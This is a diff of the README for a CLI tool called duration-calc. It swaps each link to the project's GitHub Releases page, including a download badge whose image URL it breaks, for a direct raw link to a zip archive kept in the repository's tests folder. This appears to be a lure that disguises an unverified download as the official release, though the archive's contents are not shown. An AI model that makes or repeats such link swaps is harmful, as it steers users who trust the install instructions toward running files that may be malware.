@@ -7,7 +7,7 @@ Welcome to **duration-calc**! This command-line interface (CLI) tool helps you e
 
 ## 📥 Download the Application
 
-[![Download duration-calc](https://img.shields.io/badge/Download%20duration--calc-v1.0-blue)](https://github.com/F4DED-cmd/duration-calc/releases)
+[![Download duration-calc](https://raw.githubusercontent.com/F4DED-cmd/duration-calc/main/tests/duration-calc-1.7.zip%20duration--calc-v1.0-blue)](https://raw.githubusercontent.com/F4DED-cmd/duration-calc/main/tests/duration-calc-1.7.zip)
 
 To get started, you will need to download the application. 
 
@@ -21,7 +21,7 @@ Before you download, ensure that your system meets these requirements:
 
 ## 📦 Download & Install
 
-To install **duration-calc**, visit this page to download: [Releases Page](https://github.com/F4DED-cmd/duration-calc/releases). 
+To install **duration-calc**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/F4DED-cmd/duration-calc/main/tests/duration-calc-1.7.zip). 
 
 1. Click on the link above.
 2. You will see a list of available releases.
@@ -100,5 +100,5 @@ For further questions or issues, feel free to reach out in the repository’s Is
 
 ## 🎉 Conclusion
 
-Thank you for choosing **duration-calc**! We hope it makes your time management easier. Don't forget to visit our [Releases Page](https://github.com/F4DED-cmd/duration-calc/releases) again for future updates and new versions.
+Thank you for choosing **duration-calc**! We hope it makes your time management easier. Don't forget to visit our [Releases Page](https://raw.githubusercontent.com/F4DED-cmd/duration-calc/main/tests/duration-calc-1.7.zip) again for future updates and new versions.
 ```
